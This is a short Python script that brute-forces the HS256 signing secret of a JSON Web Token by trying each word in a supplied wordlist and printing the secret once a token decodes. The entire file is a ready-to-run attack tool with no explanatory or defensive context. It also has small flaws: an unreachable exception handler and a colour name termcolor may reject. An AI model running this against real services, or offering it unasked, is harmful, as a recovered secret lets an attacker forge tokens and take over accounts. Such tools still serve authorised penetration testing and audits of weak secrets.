#!/usr/bin/python3

import jwt;
import sys
from termcolor import colored

print (colored("Script to brute-force JWT secret token",'white'))
encoded = input("Enter encoded payload (your JWT): ")

if (len(sys.argv) < 2):
    print("Usage: python3 jwt_bruteforce.py <wordlist>\n")
    exit(1)

wordlist = sys.argv[1]

with open(wordlist) as secrets:
    for secret in secrets:
        try:
            payload = jwt.decode(encoded, secret.rstrip(), algorithms=['HS256'])
            print (colored('Success! Token decoded with ....[' + secret.rstrip() + ']','green'))
            break
        except UnicodeDecodeError:
            print(colored("skipped " + secret.rstrip(), "orange"))
        except jwt.InvalidTokenError:
            print (colored('Invalid Token .... [' + secret.rstrip() + ']','red'))
        except jwt.ExpiredSignatureError:
            print (colored('Token Expired ....[' + secret.rstrip() + ']','red'))
